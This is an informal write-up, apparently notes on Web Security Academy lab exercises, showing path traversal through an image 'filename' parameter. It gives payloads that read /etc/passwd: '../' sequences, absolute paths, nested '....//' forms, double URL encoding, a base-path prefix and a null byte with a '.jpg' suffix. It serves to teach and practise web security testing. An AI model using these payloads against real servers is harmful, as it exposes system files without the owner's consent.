*Solution*

/../../../etc/passwd whoami pwd absolute path,double urlencode_not_plus ....\/ ....// %00 .jpg

In this case it is a simple case so we can jus f12 inspect the website and we saw filename u can see at the right that will help us in this task and
we modify the image?filename=img1.png into image?filename=/../../../etc/passwd sometimes cannot we use absolute path eg.  image?filename=/etc/passwd

<img width="1905" height="527" alt="Screenshot 2025-10-18 113446" src="https://github.com/user-attachments/assets/0bb9dc46-981b-4d94-acd4-fe9a68554b5e" />

normally if we cant see the image in this case so we use burpsuite to see the response 

....// or ....\/. These revert to simple traversal sequences when the inner sequence is stripped.

sometimes we need to encode or even double encode for me i use Hackvector urlencode_not_plus ( only encode special character)double this=double url encoding u can use cyberchef too 

u can use /var/www/images/../../../etc/passwd

eg. https://0aab003c047fc38681c3939500cc009d.web-security-academy.net/image?filename=/var/www/images/../../../../../../../../etc/passwd

using null byte (stop the backend to processed until there)%00
eg. https://0a6000bb04b9bba78039125d00a6001b.web-security-academy.net/image?filename=../../../../../etc/passwd%00.jpg
